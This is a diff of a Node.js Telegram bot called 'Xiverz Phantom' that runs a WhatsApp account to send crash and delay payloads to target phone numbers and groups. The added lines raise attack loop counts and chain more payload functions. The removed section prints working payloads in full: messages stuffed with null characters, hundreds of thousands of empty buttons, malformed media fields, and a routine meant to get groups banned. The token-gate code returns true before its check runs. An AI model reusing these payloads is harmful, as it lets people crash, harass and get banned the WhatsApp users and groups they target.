@@ -1,3 +1,11 @@
+/*
+
+<\> Base By AlipzzyOfficiaL 
+<\> No Delete Credit
+<\> No Selling Base Private XiverzPhantom
+— XvZTeam
+
+*/
 const { Telegraf } = require("telegraf");
 const { spawn, spawnSync } = require('child_process');
 const { pipeline } = require('stream/promises');
@@ -31,6 +39,7 @@ const { tokenBot, ownerID } = require("./XvZSettings/config");
 const axios = require('axios');
 const moment = require('moment-timezone');
 const { EventEmitter } = require('events');
+
 const makeInMemoryStore = ({ logger = console } = {}) => {
 const ev = new EventEmitter()
 function getHash(data) {
@@ -180,7 +189,7 @@ function extractInviteCode(link) {
 ☇ Version : VIP
   `))
   }
-            
+  
   const hash = Buffer.from(secure.toString()).toString("base64");
   setInterval(() => {
     if (Buffer.from(secure.toString()).toString("base64") !== hash) {
@@ -234,6 +243,7 @@ function extractInviteCode(link) {
         activateSecureMode();
         hardExit(1);
       }
+
       for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
         if (process.listeners(sig).length > 0) {
           console.log(chalk.bold.yellow(`
@@ -317,6 +327,8 @@ function extractInviteCode(link) {
 ☇ Name Script : Xiverz Phantom
 ☇ Version : VIP
   `));
+    // Gagal cek token (mis. DB tak terjangkau) → fail-closed: kembalikan false.
+    // Tidak ada process.exit di sini, jadi tidak ada yang bisa di-override.
     activateSecureMode();
     return false;
   }
@@ -394,6 +406,12 @@ async function isAuthorizedToken(token) {
 
 const bot = new Telegraf(tokenBot);
 let tokenValidated = false;
+
+// Gate keamanan token: divalidasi SEKALI, hasilnya (true/false) dipakai untuk
+// memutuskan apakah logika utama (startSesi & bot.launch) boleh jalan.
+// Prinsip: keputusan lewat ALUR KONTROL (if/else), bukan process.exit — jadi
+// tidak ada satu fungsi pun yang bisa di-override user untuk melewati proteksi.
+// .catch(() => false) menjaga gate selalu resolve ke boolean (fail-closed).
 const tokenGate = Promise.resolve()
     .then(() => validateToken(databaseUrl, tokenBot))
     .then((ok) => {tokenValidated = true; return true; tokenValidated = ok === true; return tokenValidated; })
@@ -903,10 +921,15 @@ const startSesi = async () => {
     }
 };
 
+// Gate sesi WhatsApp: if valid -> jalan normal, else -> tidak melakukan apa-apa.
 tokenGate.then((tokenOk) => {
   if (tokenOk) {
+    // Token valid → jalankan logika utama seperti biasa.
     startSesi();
   } else {
+    // Token tidak valid/gagal cek → do nothing.
+    // Tidak ada process.exit di sini, jadi tidak ada yang bisa di-bypass;
+    // logika utama sekadar tidak pernah dijalankan.
   }
 });
 
@@ -1550,6 +1573,7 @@ function stopBlink(chatId) {
   }
 }
 
+
 bot.start(async (ctx) => {
     const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
     const senderStatus = isWhatsAppConnected ? "Yes" : "No";
@@ -1586,6 +1610,7 @@ const sent = await ctx.replyWithPhoto(videoUrl, {
   rememberPanel(chatId, sent.message_id, menuMessage);
   startBlink(ctx, chatId, sent.message_id);
 });
+
 bot.action('/start', async (ctx) => {
     try {
     const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
@@ -1636,6 +1661,7 @@ bot.action('/start', async (ctx) => {
     await ctx.answerCbQuery();
   }
 });
+
 bot.action('/controls', async (ctx) => {
     const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
     const runtimeStatus = formatRuntime();
@@ -1700,6 +1726,7 @@ bot.action('/controls', async (ctx) => {
         }
     }
 });
+
 bot.action('/bug', async (ctx) => {
     const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
     const runtimeStatus = formatRuntime();
@@ -1733,7 +1760,7 @@ bot.action('/bug', async (ctx) => {
 ╰═─────────────═⬡
 
 ╭═───⊱ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂  ───═⬡
-│✧ /xban 
+│✧ /xban [ Maintenance ]
 │╰─➤ ʙᴀɴɴᴇᴅ ɢʀᴏᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ
 │✧ /xslash
 │╰─➤ ᴄʀᴀsʜ ɪɴᴠɪsɪʙʟᴇ ɢʀᴏᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ
@@ -1764,6 +1791,7 @@ bot.action('/bug', async (ctx) => {
         }
     }
 });
+
 bot.action('/tools', async (ctx) => {
     const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
     const runtimeStatus = formatRuntime();
@@ -1815,6 +1843,7 @@ bot.action('/tools', async (ctx) => {
         }
     }
 });
+
 bot.action('/tqto', async (ctx) => {
     const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
     const runtimeStatus = formatRuntime();
@@ -1870,6 +1899,7 @@ bot.action('/tqto', async (ctx) => {
         }
     }
 });
+
 bot.command("cekid", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   try {
     const text = ctx.message.text;
@@ -1916,7 +1946,7 @@ bot.command("cekid", checkWhatsAppConnection, checkPremium, checkCooldown, async
     ctx.reply("❌ ☇ Gagal mengambil Id grup");
   }
 });
-/* COMMAND BUG #1 */
+
 bot.command("ghost", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /ghost 62×××`);
@@ -1941,9 +1971,11 @@ bot.command("ghost", checkWhatsAppConnection, checkPremium, checkCooldown, async
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 15; i++) {
+  for (let i = 0; i < 10; i++) {
     await XvZDelay(sock, target);
+    await XvZDelayV1(sock, target);
     await XvZDelayV2(sock, target);
+    await XvZDelayV3(sock, target);
     await sleep(2500);
   }
 
@@ -1960,7 +1992,7 @@ bot.command("ghost", checkWhatsAppConnection, checkPremium, checkCooldown, async
     }
   });
 });
-/* COMMAND BUG #2 */
+
 bot.command("xghost", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xghost 62×××`);
@@ -1985,10 +2017,10 @@ bot.command("xghost", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 70; i++) {
+  for (let i = 0; i < 100; i++) {
     await XvZDelay(sock, target);
     await XvZDelayV1(sock, target);
-    //await XvZDelayV2(sock, target);
+    await XvZDelayV2(sock, target);
     await sleep(2000);
   }
 
@@ -2005,7 +2037,7 @@ bot.command("xghost", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     }
   });
 });
-/* COMMAND BUG #3 */
+
 bot.command("xollow", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xollow 62×××`);
@@ -2033,6 +2065,8 @@ bot.command("xollow", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     for (let i = 0; i < 50; i++) {
     await XvZFc(sock, target);
     await XvZFcV1(sock, target);
+    await XvZFcV2(sock, target);
+    await XvZFcV3(sock, target);
     await sleep(1000);
     }
 
@@ -2049,7 +2083,7 @@ bot.command("xollow", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     }
   });
 });
-/* COMMAND BUG #4 */
+
 bot.command("xlite", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xlite 62×××`);
@@ -2075,7 +2109,10 @@ bot.command("xlite", checkWhatsAppConnection, checkPremium, checkCooldown, async
   const processMessageId = processMessage.message_id;
 
      for (let i = 0; i < 100; i++) {
-         await XvZFcV1(sock, target);
+         await XvZBlank(sock, target);
+         await XvZBlankV1(sock, target);
+         await XvZBlankV2(sock, target);
+         await XvZBlankV3(sock, target);
          await sleep(3500);
          }
 
@@ -2092,7 +2129,7 @@ bot.command("xlite", checkWhatsAppConnection, checkPremium, checkCooldown, async
     }
   });
 });
-/* COMMAND BUG #5 */
+
 bot.command("xburn", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xburn 62×××`);
@@ -2119,6 +2156,9 @@ bot.command("xburn", checkWhatsAppConnection, checkPremium, checkCooldown, async
   
   for (let i = 0; i < 60; i++) {
     await XvZiOS(sock, target);
+    await XvZiOSV1(sock, target);
+    await XvZiOSV2(sock, target);
+    await XvZiOSV3(sock, target);
     await sleep(1500);
   }
 
@@ -2137,7 +2177,7 @@ bot.command("xburn", checkWhatsAppConnection, checkPremium, checkCooldown, async
 });
 
 //=================== [ CASE BVG GB ] ===================//
-/* COMMAND BUG #6 */
+
 bot.command("xslash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xslash 12×××@g.us`);
@@ -2181,7 +2221,7 @@ bot.command("xslash", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
     }
   });
 });
-/* COMMAND BUG #7 */
+
 bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 ☇ Format: /xban 12×××@g.us`);
@@ -2206,7 +2246,7 @@ bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async 
 
   const processMessageId = processMessage.message_id;
 
-  for (let i = 0; i < 3; i++) {
+  for (let i = 0; i < 4; i++) {
     await XvZBanGb(sock, target);
     await sleep(1500);
   }
@@ -2334,718 +2374,19 @@ bot.command("testfunc", checkWhatsAppConnection, checkPremium, checkCooldown, as
   }
 )
 
-// Function Bug WhatsApp
-async function XvZDelay(sock, target) {
-    await sock.relayMessage(target, {
-        groupStatusMessageV2: {
-            message: {
-                extendedTextMessage: {
-                    text: "\u0000".repeat(75000),
-                    contextInfo: {
-                        participant: true,
-                        mentionedJid: [
-                            "0@s.whatsapp.net",
-                            ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
-                        ]
-                    }
-                }
-            }
-        }
-    }, { participant: true });
+// Function
 
-    await sock.relayMessage(target, {
-        groupStatusMessageV2: {
-            nativeFlowMessage: {
-                extendedTextMessage: {
-                    text: "\u0003".repeat(9000),
-                    contextInfo: {
-                        participant: target,
-                        mentionedJid: [
-                            "0@s.whatsapp.net",
-                            ...Array.from(
-                                { length: 1999 },
-                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
-                            )
-                        ]
-                    }
-                }
-            }
-        }
-    }, { participant: true });
-
-    const startTime2 = Date.now();
-    const duration2 = 1 * 60 * 1000;
-
-    while (Date.now() - startTime2 < duration2) {
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: {
-                    extendedTextMessage: {
-                        text: "\u0003".repeat(75000),
-                        contextInfo: {
-                            participant: true,
-                            mentionedJid: [
-                                "0@s.whatsapp.net",
-                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
-                            ]
-                        }
-                    }
-                }
-            }
-        }, { participant: true });
-    }
-
-    const LexzyyMsg = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "Xiverz Phantom¿!",
-                    },
-                    nativeFlowMessage: {
-                        buttons: Array.from({ length: 700000 }, () => ({}))
-                    },
-                    contextInfo: {
-                        quotedMessage: {
-                            orderMessage: {
-                                orderTitle: "XvZMSG",
-                                itemCount: 1999,
-                                totalAmount1000: "1000000",
-                                totalCurrencyCode: "IDR"
-                            },
-                        },
-                    },
-                },
-            },
-        }
-    };
-
-    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});
-
-    await sock.relayMessage(target, acamsg.message, {
-        participant: true,
-        messageId: acamsg.key.id
-    });
-
-    const LexMsg = {
-        interactiveMessage: {
-            nativeFlowMessage: {
-                buttons: [
-                    {
-                        name: "payment_info",
-                        buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
-                    }
-                ]
-            }
-        }
-    };
-
-    const Lexx = generateWAMessageFromContent(target, LexMsg, {});
-
-    await sock.relayMessage(target, Lexx.message, {
-        participant: true,
-        messageId: Lexx.key.id
-    });
-
-    const LexzyExe = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "Alpzzy.exe¿!"
-                    },
-                    nativeFlowMessage: {
-                        buttons: "{}".repeat(75000),
-                    },
-                },
-            },
-        },
-    };
-
-    const Lexxx = generateWAMessageFromContent(target, LexzyExe, {});
-
-    await sock.relayMessage(target, Lexxx.message, {
-        participant: true,
-        messageId: Lexxx.key.id
-    });
-
-    const LexMsg2 = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        imageMessage: {
-                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
-                            mimetype: "image/jpeg",
-                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
-                            fileLength: 9999,
-                            height: 9999,
-                            width: 9999,
-                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
-                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
-                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
-                            mediaKeyTimestamp: "1776937541",
-                            jpegThumbnail: null,
-                            caption: "LexzyMods - Executed¿!",
-                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
-                            scanLengths: [
-                                9999999999999999999,
-                                9999999999999999999,
-                                9999999999999999999,
-                                9999999999999999999
-                            ],
-                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
-                        }
-                    },
-                    body: {
-                        text: "XvZTeam¿!"
-                    },
-                    nativeFlowMessage: {
-                        buttons: Array.from({ length: 500000 }, () => ({}))
-                    }
-                }
-            }
-        }
-    };
-
-    const Lexca = generateWAMessageFromContent(target, LexMsg2, {});
-
-    await sock.relayMessage(target, Lexca.message, {
-        participant: true,
-        messageId: Lexca.key.id
-    });
-
-    const Lexcaa = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "Xiverz Phantom¿!"
-                    },
-                    nativeFlowMessage: {
-                        buttons: Array.from({ length: 500000 }, () => ({}))
-                    }
-                }
-            }
-        }
-    };
-
-    const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});
-
-    await sock.relayMessage(target, Lexcaabos.message, {
-        participant: true,
-        messageId: Lexcaabos.key.id
-    });
-
-    const Msg = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    body: {
-                        text: "Xiverz Phantom",
-                    },
-                    nativeFlowMessage: {
-                        button: "\x10".repeat(2000),
-                    },
-                },
-            },
-        },
-    };
-
-    const Lex = generateWAMessageFromContent(target, Msg, {});
-
-    await sock.relayMessage(target, Lex.message, {
-        participant: true,
-        messageId: Lex.key.id
-    });
-
-    const ahk = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        imageMessage: {
-                            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
-                            mimetype: "image/jpeg",
-                            caption: "iniochamy - Executed¿!",
-                            fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
-                            fileLength: 9999999,
-                            height: 9999,
-                            width: 9999,
-                            mediaKey: "3q2+7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
-                            fileEncSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
-                            directPath: "/v/t62.7118-24/1234567890123456.enc?ccb=11-4&oh=abc123&oe=6A12ED53",
-                            mediaKeyTimestamp: "1746057600",
-                            jpegThumbnail: null,
-                            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
-                            scanLengths: [
-                                9999999999999998555,
-                                9999999999999998555,
-                                9699999999999999148,
-                                9969999999999999164
-                            ],
-                            midQualityFileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
-                            contextInfo: {
-                                pairedMediaType: "PAIRED_PERMANENT",
-                                isQuestion: true,
-                                isGroupStatus: true,
-                                remoteJid: "status@broadcast",
-                                entryPointConversionDelaySeconds: 999999,
-                                entryPointConversionSource: "ctwa"
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    };
-
-    const acasayanglexzy = generateWAMessageFromContent(target, ahk, {});
-
-    await sock.relayMessage(target, acasayanglexzy.message, {
-        participant: true,
-        messageId: acasayanglexzy.key.id
-    });
-
-    const ochasayang = {
-        groupStatusMessageV2: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        imageMessage: {
-                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
-                            mimetype: "image/jpeg",
-                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
-                            fileLength: 9999,
-                            height: 9999,
-                            width: 9999,
-                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
-                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
-                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
-                            mediaKeyTimestamp: "1776937541",
-                            jpegThumbnail: null,
-                            caption: "XvZTeam¿!",
-                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
-                            scanLengths: [
-                                9999999999999999999,
-                                9999999999999999999,
-                                9999999999999999999,
-                                9999999999999999999
-                            ],
-                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
-                        }
-                    },
-                    body: {
-                        text: "\n" + "\x10",
-                    },
-                    nativeFlowMessage: {
-                        buttons: Array.from({ length: 500000 }, () => ({}))
-                    }
-                }
-            }
-        }
-    };
-
-    const lexzysayangaca = generateWAMessageFromContent(target, ochasayang, {});
-
-    await sock.relayMessage(target, lexzysayangaca.message, {
-        participant: true,
-        messageId: lexzysayangaca.key.id
-    });
-}
-async function XvZDelayV1(sock, target) {
-    const msg = {
-        interactiveMessage: {
-            body: {
-                text: "X"
-            },
-            nativeFlowMessage: {
-                buttons: "\0".repeat(500000)
-            }
-        }
-    };
-
-    await sock.relayMessage("status@broadcast", {
-        groupStatusMessageV2: {
-            message: msg
-        }
-    }, {
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{
-                    tag: "to",
-                    attrs: { jid: target }
-                }]
-            }]
-        }]
-    });
-}
-async function XvZDelayV2(sock, target) {
-    for (let i = 0; i < 10; i++) {
-        await sock.relayMessage(target, {
-            botForwardedMessage: {
-                message: {
-                    richResponseMessage: {
-                        messageType: 1,
-                        submessages: [{
-                            messageType: 7,
-                            mapMetadata: {
-                                centerLatitude: -999999,
-                                centerLongitude: 99999,
-                                latitudeDelta: 99999,
-                                longitudeDelta: 99999,
-                                annotations: [{
-                                    annotationNumber: 1,
-                                    latitude: -999999,
-                                    longitude: 99999999,
-                                    title: "\0".repeat(500000),
-                                    body: "𑇂𑆵𑆴𑆿".repeat(500)
-                                }, {
-                                    annotationNumber: 1,
-                                    latitude: -999999,
-                                    longitude: 99999999,
-                                    title: "🦠‌°‌‌•⃟𝘅𝗿‌𝗲‌𝗹⃨𝗹𝘆‌‌-𝗰‌𝗹𝗶⃨𝗲𝗻‌‌𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶>666" + "\0".repeat(5000),
-                                    body: "𑇂𑆵𑆴𑆿".repeat(500)
-                                }, {
-                                    annotationNumber: 1,
-                                    latitude: -999999,
-                                    longitude: 99999999,
-                                    title: "\0".repeat(500000),
-                                    body: "\0".repeat(5000)
-                                }]
-                            }
-                        }],
-                        contextInfo: {
-                            forwardingScore: 9999,
-                            isForwarded: true,
-                            forwardedAiBotMessageInfo: {
-                                botJid: "259786046210223@bot"
-                            },
-                            forwardOrigin: 4,
-                            botMessageSharingInfo: {
-                                botEntryPointOrigin: 1,
-                                forwardScore: 99
-                            }
-                        }
-                    }
-                }
-            }
-        }, {
-            isSecret: true
-        });
-    }
-}
-async function XvZFc(sock, target) {
-  await sock.relayMessage(
-    target,
-    {
-      groupStatusMessageV2: {
-        message: {
-          interactiveMessage: {
-            header: {
-              imageMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
-                mimetype: "image/jpeg",
-                fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
-                fileLength: "93217",
-                caption: " Xiverz Phantom ¡!. ",
-                height: 1080,
-                width: 1080,
-                mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
-                fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
-                directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1778142659",
-                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
-                contextInfo: {
-                  pairedMediaType: "NOT_PAIRED_MEDIA",
-                  isQuestion: true,
-                  isGroupStatus: true
-                },
-                scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
-                scanLengths: [
-                10000000000000000000,
-                10000000000000000000,
-                10000000000000000000,
-                10000000000000000000],
-                midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
-              },
-              title: "",
-              hasMediaAttachment: true
-            },
-            body: {
-              text: ""
-            },
-            nativeFlowMessage: {
-              buttons: "[".repeat(500000)
-            }
-          }
-        }
-      }
-    },
-    { noSelfSync: true }
-  );
-}
-async function XvZFcV1(sock, target) {
-  const Gorenk = {
-    richMessage: {
-      post: Array.from({ length: 18 }, () => ({
-        title: " XiverzPhantom ¡!",
-        username: " Xiverz Phantom ",
-        like_count: -1,
-        comments_count: -1,
-        thumbnail_url: "https://files.catbox.moe/7d8s61.jpg",
-        post_url: "https://files.catbox.moe/7d8s61.jpg",
-        post_caption: "ြ".repeat(7700)
-      })),
-      contextInfo: {
-        mentionedJid: Array.from(
-          { length: 2000 },
-          () =>
-            "1" +
-            Math.floor(Math.random() * 9000000) +
-            "@s.whatsapp.net"
-        )
-      }
-    }
-  };
-
-  const Monyet = generateWAMessageFromContent(target, Gorenk, {});
-  await sock.relayMessage(target, Monyet.message, {
-    messageId: Monyet.key.id
-  });
-  const Liwet = {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          header: {
-            locationMessage: {
-              degreesLatitude: 0,
-              degreesLongitude: 0,
-              name: "JS",
-              address: "javascripts",
-              url: "https://t.me/XvZTeam",
-              jpegThumbnail: ""
-            },
-            hasMediaAttachment: true
-          },
-          body: {
-            text: "Xiverz Phantom ¡!"
-          },
-          nativeFlowMessage: {
-            buttons: [
-              {
-                name: "single_select",
-                buttonParamsJson: JSON.stringify({
-                  title: "𑇂𑆵𑆴𑆿".repeat(10000),
-                  sections: []
-                })
-              },
-              {
-                name: "galaxy_message",
-                buttonParamsJson: JSON.stringify({
-                  icon: "DOCUMENT",
-                  flow_cta:
-                    " \x10 " + "𑇂𑆵𑆴𑆿".repeat(25000),
-                  flow_message_version: " 3"
-                })
-              }
-            ]
-          }
-        }
-      }
-    }
-  };
-
-  const Juga = generateWAMessageFromContent(target, Liwet, {});
-  await sock.relayMessage(target, Juga.message, {
-    messageId: Juga.key.id
-  });
-
-  const Syududu = {
-    interactiveMessage: {
-      header: {
-        title: "XvZ"
-      },
-      body: {
-        text: "XvZTeam"
-      },
-      nativeFlowMessage: {
-        buttons: Array.from({ length: 500000 }, () => ({}))
-      },
-      contextInfo: {
-        mentionedJid: [target],
-        forwardingScore: 9898989,
-        isForwarded: true
-      }
-    }
-  };
-
-  const Mangan = generateWAMessageFromContent(target, Syududu, {});
-  await sock.relayMessage(target, Mangan.message, {
-    messageId: Mangan.key.id
-  });
-}
-async function XvZiOS(sock, target) {
-    await sock.relayMessage('status@broadcast', {
-      botForwardedMessage: {
-        message: {
-          richResponseMessage: {
-            messageType: 1,
-            submessages: [],
-            unifiedResponse: {
-              data: Buffer.from(JSON.stringify({
-                response_id: crypto.randomUUID(),
-                sections: [
-                  {
-                    view_model: {
-                      primitive: {
-                        text: "x",
-                        inline_entities: ["{".repeat(90000)],
-                        __typename: "GenAIMarkdownTextUXPrimitive",
-                        },
-                      __typename: "GenAISingleLayoutViewModel",
-                    }
-                  }
-                ]
-              }))
-            },
-            contextInfo: {
-              forwardingScore: 1,
-              isForwarded: true,
-              forwardOrigin: 4,
-              forwardedAiBotMessageInfo: {
-                botJid: "0@bot"
-              }
-            }
-          }
-        }
-      }
-    }, {
-      statusJidList: [target]
-  })
-}
-async function XvZBanGb(sock, groupJid) {
-    if (!groupJid.endsWith('@g.us')) {
-        throw new Error('@g.us server required');
-    }
-
-    const targets = [
-        "18188880008@s.whatsapp.net",
-        "18188880009@s.whatsapp.net",
-        "18188880010@s.whatsapp.net",
-        "18188880011@s.whatsapp.net",
-        "18188880012@s.whatsapp.net"
-    ];
-    const action = "add";
-    const maxLoop = 10;
-
-    for (let i = 0; i < maxLoop; i++) {
-        for (let j = 0; j < targets.length; j++) {
-            try {
-                await sock.groupParticipantsUpdate(groupJid, [targets[j]], action);
-                await sock.sendPresenceUpdate('composing', groupJid);
-            } catch (err) {
-                console.error('error:', err.message);
-            }
-        }
-    }
-}
-async function XvZGb(sock, groupJid) {
-const groupMetadata = await sock.groupMetadata(groupJid);
-const members = groupMetadata.participants.map(p => p.id);
-
-  const msg = generateWAMessageFromContent(groupJid, {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          header: {
-            imageMessage: {
-              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc",
-              mimetype: "image/jpeg",
-              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
-              fileLength: 9999,
-              height: 9999,
-              width: 9999,
-              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
-              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
-              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc",
-              mediaKeyTimestamp: "1776937541",
-              jpegThumbnail: null,
-              caption: "XiverzPhantom",
-              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
-              scanLengths: [9999999999999999999,9999999999999999999,9999999999999999999,9999999999999999999
-              ],
-              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
-            }
-          },
-                     body: {
-    
-          text: "— Alpzzy.exe#/."
-          },
-          nativeFlowMessage: {
-            buttons: Array.from({ length: 500000 }, () => ({}))
-          },
-          contextInfo: {
-            mentionedJid: members,
-            groupMentions: []
-          }
-        }
-      }
-    }
-  }, {});
-
-  await sock.relayMessage(groupJid, msg.message, {
-    messageId: msg.key.id
-  });
-}
-async function XvZGbV1(sock, groupJid){
-const Memek = generateWAMessageFromContent(groupJid, {
-interactiveMessage: {
-header: {
-title: " Heksen - Jahat Ne",
-hasMediaAttachment: true,
